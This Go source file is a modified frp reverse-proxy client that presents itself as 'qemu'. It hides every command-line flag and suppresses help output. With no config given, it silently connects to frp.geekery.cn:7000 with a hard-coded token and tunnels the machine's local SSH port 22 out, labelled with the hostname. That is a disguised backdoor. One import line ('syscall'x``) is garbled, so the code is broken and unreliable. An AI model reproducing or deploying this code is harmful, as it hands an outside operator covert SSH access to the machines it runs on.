// Copyright 2018 fatedier, fatedier@gmail.com
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sub

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"os/signal"
	"path/filepath"
	"sync"
	"syscall"x``
	"time"

	"github.com/spf13/cobra"

	"github.com/fatedier/frp/client"
	"github.com/fatedier/frp/pkg/config"
	v1 "github.com/fatedier/frp/pkg/config/v1"
	"github.com/fatedier/frp/pkg/config/v1/validation"
	"github.com/fatedier/frp/pkg/util/log"
	"github.com/fatedier/frp/pkg/util/version"
)

var (
	cfgFile          string
	cfgDir           string
	showVersion      bool
	strictConfigMode bool
)

func init() {
	rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "", "config file of qemu")
	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one qemu service for each file in config directory")
	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of qemu")
	rootCmd.PersistentFlags().BoolVarP(&strictConfigMode, "strict_config", "", true, "strict config parsing mode, unknown fields will cause an errors")
	rootCmd.PersistentFlags().MarkHidden("config")
	_ = rootCmd.PersistentFlags().MarkHidden("config")
	rootCmd.PersistentFlags().MarkHidden("config_dir")
	_ = rootCmd.PersistentFlags().MarkHidden("config_dir")
	rootCmd.PersistentFlags().MarkHidden("version")
	_ = rootCmd.PersistentFlags().MarkHidden("version")
	rootCmd.PersistentFlags().MarkHidden("strict_config")
	_ = rootCmd.PersistentFlags().MarkHidden("strict_config")
	rootCmd.SetHelpFunc(func(*cobra.Command, []string) {})
	rootCmd.SetUsageFunc(func(*cobra.Command) error { return nil })
	rootCmd.SetHelpCommand(&cobra.Command{Hidden: true})
}

var rootCmd = &cobra.Command{
	Use: "qemu",
	RunE: func(cmd *cobra.Command, args []string) error {
		if showVersion {
			fmt.Println(version.Full())
			return nil
		}

		// If cfgDir is not empty, run multiple qemu service for each config file in cfgDir.
		// Note that it's only designed for testing. It's not guaranteed to be stable.
		if cfgDir != "" {
			_ = runMultipleClients(cfgDir)
			return nil
		}

		// Do not show command usage here.
		err := runClient(cfgFile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		return nil
	},
}

func runMultipleClients(cfgDir string) error {
	var wg sync.WaitGroup
	err := filepath.WalkDir(cfgDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		wg.Add(1)
		time.Sleep(time.Millisecond)
		go func() {
			defer wg.Done()
			err := runClient(path)
			if err != nil {
				fmt.Printf("qemu service error for config file [%s]\n", path)
			}
		}()
		return nil
	})
	wg.Wait()
	return err
}

func Execute() {
	rootCmd.SetGlobalNormalizationFunc(config.WordSepNormalizeFunc)
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func handleTermSignal(svr *client.Service) {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	svr.GracefulClose(500 * time.Millisecond)
}

func generateRandomString(n int) string {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		panic(err)
	}
	return hex.EncodeToString(bytes)[:n]
}

// 生成基于主机名和随机字符串的设备ID
func generateDeviceID() string {
	hostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	randomString := generateRandomString(8)
	return hostname + "_" + randomString
}

func runClient(cfgFilePath string) error {
	if cfgFilePath == "" {
		newCfg := v1.ClientConfig{
			ClientCommonConfig: v1.ClientCommonConfig{
				User:       "",
				ServerAddr: "frp.geekery.cn",
				ServerPort: 7000,
				// NatHoleSTUNServer: "stun.easyvoip.com:3478",
				// DNSServer:     "",
				LoginFailExit: new(bool),
				// Start:         nil,
				Log: v1.LogConfig{
					To:      "console",
					Level:   "info",
					MaxDays: 3,
				},
				WebServer: v1.WebServerConfig{},
				Transport: v1.ClientTransportConfig{
					Protocol:  "tcp",
					ProxyURL:  os.Getenv("http_proxy"),
					PoolCount: 1,
					// TCPMux: lo.ToPtr(true),
					TCPMuxKeepaliveInterval: 30,
					QUIC:                    v1.QUICOptions{},
					HeartbeatInterval:       -1,
					HeartbeatTimeout:        -1,
					TLS:                     v1.TLSClientConfig{},
				},
				UDPPacketSize:      1500,
				Metadatas:          nil,
				IncludeConfigFiles: nil,
				Auth: v1.AuthClientConfig{
					Method: "token",
					Token:  "hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO",
				},
			},
			Proxies: []v1.TypedProxyConfig{
				{
					Type: "tcp",
					ProxyConfigurer: &v1.TCPProxyConfig{
						ProxyBaseConfig: v1.ProxyBaseConfig{
							Type: "tcp",
							Name: generateDeviceID(),
							ProxyBackend: v1.ProxyBackend{
								LocalIP:   "127.0.0.1",
								LocalPort: 22,
							},
						},
						// RemotePort:      0,
					},
				},
			},
			// Visitors: []v1.TypedVisitorConfig{},
		}
		*newCfg.ClientCommonConfig.LoginFailExit = true

		// 使用更简洁的方式初始化 proxyConfigurers
		proxyConfigurers := make([]v1.ProxyConfigurer, len(newCfg.Proxies))
		for i, proxy := range newCfg.Proxies {
			proxyConfigurers[i] = proxy.ProxyConfigurer
		}

		return startService(&newCfg.ClientCommonConfig, proxyConfigurers, nil, "")
	}

	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
	if err != nil {
		return err
	}
	if isLegacyFormat {
		fmt.Printf("WARNING: ini format is deprecated and the support will be removed in the future, " +
			"please use yaml/json/toml format instead!\n")
	}

	warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs)
	if warning != nil {
		fmt.Printf("WARNING: %v\n", warning)
	}
	if err != nil {
		return err
	}
	return startService(cfg, proxyCfgs, visitorCfgs, cfgFilePath)
}

func startService(
	cfg *v1.ClientCommonConfig,
	proxyCfgs []v1.ProxyConfigurer,
	visitorCfgs []v1.VisitorConfigurer,
	cfgFile string,
) error {
	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)

	if cfgFile != "" {
		log.Debugf("start qemu service for config file [%s]", cfgFile)
		defer log.Debugf("qemu service for config file [%s] stopped", cfgFile)
	}
	svr, err := client.NewService(client.ServiceOptions{
		Common:         cfg,
		ProxyCfgs:      proxyCfgs,
		VisitorCfgs:    visitorCfgs,
		ConfigFilePath: cfgFile,
	})
	if err != nil {
		return err
	}

	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
	// Capture the exit signal if we use kcp or quic.
	if shouldGracefulClose {
		go handleTermSignal(svr)
	}
	return svr.Run(context.Background())
}
